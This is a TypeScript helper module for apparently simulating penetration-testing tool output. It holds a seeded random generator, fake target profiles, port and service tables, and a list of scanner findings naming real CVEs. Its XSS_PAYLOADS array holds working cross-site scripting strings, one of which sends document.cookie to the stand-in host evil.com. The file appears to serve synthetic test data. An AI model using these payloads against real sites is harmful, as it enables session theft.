// Shared types, data constants, and helper functions for output generators

export class SeededRNG {
  private seed: number;

  constructor(seed: number) {
    this.seed = seed;
  }

  next(): number {
    this.seed = (this.seed * 1664525 + 1013904223) & 0xffffffff;
    return (this.seed >>> 0) / 0xffffffff;
  }

  pick<T>(arr: T[]): T {
    return arr[Math.floor(this.next() * arr.length)];
  }

  pickN<T>(arr: T[], n: number): T[] {
    const shuffled = [...arr].sort(() => this.next() - 0.5);
    return shuffled.slice(0, Math.min(n, arr.length));
  }

  int(min: number, max: number): number {
    return Math.floor(this.next() * (max - min + 1)) + min;
  }

  float(min: number, max: number): number {
    return min + this.next() * (max - min);
  }

  bool(probability: number = 0.5): boolean {
    return this.next() < probability;
  }
}

export interface TargetProfile {
  ip: string;
  domain: string;
  openPorts: number[];
  subdomains: string[];
  directories: string[];
  technologies: string[];
  techHeaders: string[];
  pageTitles: string[];
  databases: DatabaseProfile;
  injectableParams: string[];
  reflectedParams: string[];
  userCount: number;
}

export interface DatabaseProfile {
  name: string;
  versions: string[];
  databases: string[];
}

export interface OutputContext {
  rng: SeededRNG;
  generateDate(): string;
  generateUUID(): string;
  generateHex(length: number): string;
  generateRandomUser(): { username: string; email: string; role: string; password_hash: string };
  generateEnvFileOutput(targetProfile: TargetProfile): string;
  timestamp(): string;
  generateSqlPayload(param: string, technique: string, dbms: string): string;
  generatePhone(): string;
  generateAddress(): string;
  generateBase64(length: number): string;
  generateAlphanumeric(length: number): string;
}

export function generateTargetProfile(rng: SeededRNG): TargetProfile {
  const backends = [
    { techs: ["Node.js", "Express", "PM2"], headers: ["Express", "X-Powered-By: Express"], db: { name: "MongoDB", versions: ["6.0", "7.0", "5.0.14"], databases: ["admin", "local", "webapp", "production", "analytics", "logs"] } },
    { techs: ["Node.js", "Express", "Redis"], headers: ["Express", "X-Powered-By: Express"], db: { name: "PostgreSQL", versions: [">= 14.0", ">= 15.0", "13.9"], databases: ["information_schema", "pg_catalog", "postgres", "webapp", "production"] } },
    { techs: ["Python", "Django", "Gunicorn"], headers: ["gunicorn", "WSGIServer/0.2"], db: { name: "PostgreSQL", versions: [">= 14.0", ">= 16.0", "15.4"], databases: ["information_schema", "pg_catalog", "postgres", "django_app", "auth_db"] } },
    { techs: ["Python", "Flask", "uWSGI"], headers: ["Werkzeug/2.3.7", "Python/3.11"], db: { name: "MySQL", versions: [">= 8.0", "8.0.35", "5.7.42"], databases: ["information_schema", "mysql", "performance_schema", "flask_app", "production"] } },
    { techs: ["Java", "Spring Boot", "Tomcat"], headers: ["Apache-Coyote/1.1", "Apache Tomcat/9.0.65"], db: { name: "PostgreSQL", versions: [">= 13.0", ">= 15.0", "14.10"], databases: ["information_schema", "pg_catalog", "postgres", "enterprise", "spring_db"] } },
    { techs: ["PHP", "Laravel", "Apache"], headers: ["Apache/2.4.52", "PHP/8.2.0"], db: { name: "MySQL", versions: [">= 8.0", "8.0.36", "5.7.40"], databases: ["information_schema", "mysql", "laravel_app", "production", "wordpress"] } },
    { techs: ["Ruby", "Rails", "Puma"], headers: ["Puma", "X-Runtime"], db: { name: "PostgreSQL", versions: [">= 14.0", ">= 15.0", "16.1"], databases: ["information_schema", "pg_catalog", "postgres", "rails_production", "actioncable"] } },
    { techs: ["Go", "Gin", "nginx"], headers: ["nginx/1.24.0", "Go-HTTP-Server"], db: { name: "PostgreSQL", versions: [">= 14.0", ">= 16.0", "15.5"], databases: ["information_schema", "pg_catalog", "postgres", "go_app", "sessions"] } },
    { techs: ["ASP.NET", "Kestrel", "IIS"], headers: ["Microsoft-IIS/10.0", "X-AspNet-Version: 4.0"], db: { name: "Microsoft SQL Server", versions: ["2019", "2022", "2017"], databases: ["master", "tempdb", "model", "webapp", "Northwind"] } },
    { techs: ["Python", "FastAPI", "uvicorn"], headers: ["uvicorn", "Python/3.12"], db: { name: "PostgreSQL", versions: [">= 15.0", ">= 16.0", "14.11"], databases: ["information_schema", "pg_catalog", "postgres", "fastapi_prod", "async_db"] } },
  ];

  const backend = rng.pick(backends);

  const allSubs = [
    "api", "admin", "dev", "staging", "mail", "vpn", "cdn", "internal", "test",
    "beta", "docs", "status", "help", "support", "portal", "git", "ci", "jenkins",
    "grafana", "prometheus", "kibana", "elastic", "redis", "db", "backup",
    "auth", "sso", "oauth", "app", "mobile-api", "ws", "graphql", "v2",
    "crm", "erp", "hr", "billing", "payments", "webhook", "storage", "media",
    "dashboard", "monitoring", "logs", "metrics", "config", "vault", "secrets",
  ];

  const allDirs = [
    "admin", "api", "api/v1", "api/v2", "backup", ".git", ".env", "config",
    "uploads", "static", "assets", "images", "docs", "swagger", "graphql",
    "health", "status", "metrics", "debug", "test", "phpinfo.php", "server-status",
    "robots.txt", ".well-known", "sitemap.xml", "crossdomain.xml", "web.config",
    "wp-admin", "wp-login.php", "administrator", "login", "register", "dashboard",
    "console", "actuator", "actuator/env", "actuator/health", "__debug__",
    ".git/config", ".svn", ".DS_Store", "package.json", "composer.json",
    "node_modules", "vendor", "tmp", "log", "error_log", "access.log",
  ];

  const allParams = ["id", "q", "search", "query", "user_id", "item", "page", "sort", "order", "filter", "category", "name", "file", "path", "url", "redirect", "callback", "next", "ref", "lang", "format", "type", "action", "cmd", "debug", "token", "api_key"];

  const allTitles = [
    "Dashboard - Admin Panel", "Login Portal", "API Documentation",
    "User Management", "Welcome", "Search Results", "Corporate Portal",
    "Internal Tools", "Jenkins Dashboard", "Grafana Metrics",
    "Application Home", "Account Settings", "Error Page",
    "Forbidden", "Under Maintenance", "Dev Environment",
  ];

  return {
    ip: `${rng.pick([10, 172, 192])}.${rng.int(0, 255)}.${rng.int(0, 255)}.${rng.int(1, 254)}`,
    domain: "", // set by caller
    openPorts: rng.pickN([21, 22, 25, 53, 80, 110, 143, 443, 445, 993, 995, 1433, 1521, 2049, 3000, 3306, 3389, 5432, 5900, 6379, 8000, 8080, 8443, 8888, 9090, 9200, 9300, 27017], rng.int(4, 12)),
    subdomains: rng.pickN(allSubs, rng.int(8, 25)),
    directories: rng.pickN(allDirs, rng.int(8, 20)),
    technologies: backend.techs,
    techHeaders: backend.headers,
    pageTitles: rng.pickN(allTitles, rng.int(3, 8)),
    databases: backend.db,
    injectableParams: rng.pickN(allParams, rng.int(2, 6)),
    reflectedParams: rng.pickN(allParams, rng.int(2, 5)),
    userCount: rng.int(50, 100000),
  };
}

export const PORT_SERVICES: Record<number, { service: string; versions: string[] }> = {
  21: { service: "ftp", versions: ["vsftpd 3.0.5", "ProFTPD 1.3.8", "Pure-FTPd 1.0.50"] },
  22: { service: "ssh", versions: ["OpenSSH 8.9p1", "OpenSSH 9.3p1", "OpenSSH 8.2p1", "OpenSSH 9.6p1"] },
  25: { service: "smtp", versions: ["Postfix", "Exim 4.96", "Sendmail 8.17"] },
  53: { service: "domain", versions: ["ISC BIND 9.18.12", "dnsmasq 2.89", "PowerDNS 4.8.0"] },
  80: { service: "http", versions: ["nginx 1.24.0", "Apache httpd 2.4.57", "Apache httpd 2.4.52", "nginx 1.22.1", "Microsoft IIS 10.0", "lighttpd 1.4.71"] },
  110: { service: "pop3", versions: ["Dovecot pop3d", "Cyrus pop3d"] },
  143: { service: "imap", versions: ["Dovecot imapd", "Cyrus imapd 3.8.0"] },
  443: { service: "ssl/http", versions: ["nginx 1.24.0", "Apache httpd 2.4.57", "nginx 1.22.1", "Apache httpd 2.4.52", "Node.js Express", "Kestrel"] },
  445: { service: "smb", versions: ["Samba smbd 4.18", "Windows Server 2022"] },
  1433: { service: "ms-sql-s", versions: ["Microsoft SQL Server 2019", "Microsoft SQL Server 2022"] },
  1521: { service: "oracle", versions: ["Oracle TNS listener 19c", "Oracle TNS listener 21c"] },
  3000: { service: "http", versions: ["Node.js Express", "Grafana v10.2.0", "Gitea 1.21.0", "Node.js (Koa)"] },
  3306: { service: "mysql", versions: ["MySQL 8.0.35", "MySQL 8.0.36", "MySQL 5.7.42", "MariaDB 10.11.6"] },
  3389: { service: "ms-wbt-server", versions: ["Microsoft Terminal Services"] },
  5432: { service: "postgresql", versions: ["PostgreSQL 15.4", "PostgreSQL 16.1", "PostgreSQL 14.10", "PostgreSQL 13.13"] },
  5900: { service: "vnc", versions: ["VNC (protocol 3.8)", "VNC (protocol 4.0)"] },
  6379: { service: "redis", versions: ["Redis 7.2.3", "Redis 7.0.15", "Redis 6.2.14"] },
  8000: { service: "http", versions: ["Python/3.11 aiohttp/3.9", "uvicorn", "Django dev server"] },
  8080: { service: "http-proxy", versions: ["Apache Tomcat 9.0.83", "Apache Tomcat 10.1.17", "Jenkins 2.426", "WildFly 30.0"] },
  8443: { service: "ssl/http", versions: ["Apache Tomcat 9.0.83", "nginx 1.24.0", "Jetty 11.0.18"] },
  8888: { service: "http", versions: ["Jupyter Notebook", "PHP built-in server", "aiohttp 3.9"] },
  9090: { service: "http", versions: ["Prometheus", "Cockpit web service", "Zeus Admin Server"] },
  9200: { service: "http", versions: ["Elasticsearch 8.11.3", "Elasticsearch 7.17.16", "OpenSearch 2.11.0"] },
  9300: { service: "vrace", versions: ["Elasticsearch node-to-node"] },
  27017: { service: "mongodb", versions: ["MongoDB 7.0.4", "MongoDB 6.0.12", "MongoDB 5.0.23"] },
};

export const NUCLEI_FINDINGS = [
  { id: "CVE-2021-44228", severities: ["critical"], protocol: "http", paths: ["/api/log4j", "/admin", "/api"] },
  { id: "CVE-2023-44487", severities: ["high"], protocol: "http", paths: ["/", "/api"] },
  { id: "CVE-2024-21762", severities: ["critical"], protocol: "http", paths: ["/remote/logincheck"] },
  { id: "git-config", severities: ["medium", "high"], protocol: "http", paths: ["/.git/config", "/.git/HEAD"] },
  { id: "exposed-env", severities: ["high", "critical"], protocol: "http", paths: ["/.env", "/config/.env"] },
  { id: "apache-status", severities: ["info", "low"], protocol: "http", paths: ["/server-status", "/server-info"] },
  { id: "open-redirect", severities: ["medium"], protocol: "http", paths: ["/redirect?url=", "/login?next=", "/auth?return="] },
  { id: "cors-misconfig", severities: ["high", "medium"], protocol: "http", paths: ["/api/v1/users", "/api/config", "/api"] },
  { id: "jwt-none-algorithm", severities: ["high", "critical"], protocol: "http", paths: ["/api/auth", "/auth/verify"] },
  { id: "spring-actuator", severities: ["high", "medium"], protocol: "http", paths: ["/actuator", "/actuator/env", "/actuator/health"] },
  { id: "graphql-introspection", severities: ["medium", "info"], protocol: "http", paths: ["/graphql", "/api/graphql"] },
  { id: "phpinfo", severities: ["low", "medium"], protocol: "http", paths: ["/phpinfo.php", "/info.php"] },
  { id: "directory-listing", severities: ["low", "medium"], protocol: "http", paths: ["/uploads/", "/backup/", "/images/"] },
  { id: "swagger-ui-exposed", severities: ["info", "low"], protocol: "http", paths: ["/swagger-ui.html", "/api-docs", "/swagger.json"] },
  { id: "wordpress-xmlrpc", severities: ["medium"], protocol: "http", paths: ["/xmlrpc.php"] },
  { id: "crlf-injection", severities: ["medium", "high"], protocol: "http", paths: ["/api/redirect", "/callback"] },
  { id: "host-header-injection", severities: ["medium"], protocol: "http", paths: ["/", "/reset-password"] },
  { id: "ssl-weak-cipher", severities: ["medium", "low"], protocol: "ssl", paths: [":443", ":8443"] },
  { id: "missing-security-headers", severities: ["info", "low"], protocol: "http", paths: ["/", "/api"] },
  { id: "default-credentials", severities: ["high", "critical"], protocol: "http", paths: ["/admin/login", "/manager/html", "/jenkins"] },
  { id: "s3-bucket-listing", severities: ["high"], protocol: "http", paths: ["/"] },
  { id: "exposed-debug-endpoint", severities: ["high", "critical"], protocol: "http", paths: ["/__debug__", "/debug/vars", "/debug/pprof"] },
];

export const XSS_PAYLOADS = [
  `"><svg/onload=alert(1)>`,
  `<img src=x onerror=alert(document.cookie)>`,
  `<details open ontoggle=alert(1)>`,
  `javascript:alert(1)//`,
  `'-alert(1)-'`,
  `<script>alert(document.domain)</script>`,
  `\"><img src=x onerror=fetch('//evil.com/?c='+document.cookie)>`,
  `{{constructor.constructor('return this')().alert(1)}}`,
  `<input onfocus=alert(1) autofocus>`,
  `<marquee onstart=alert(1)>`,
];
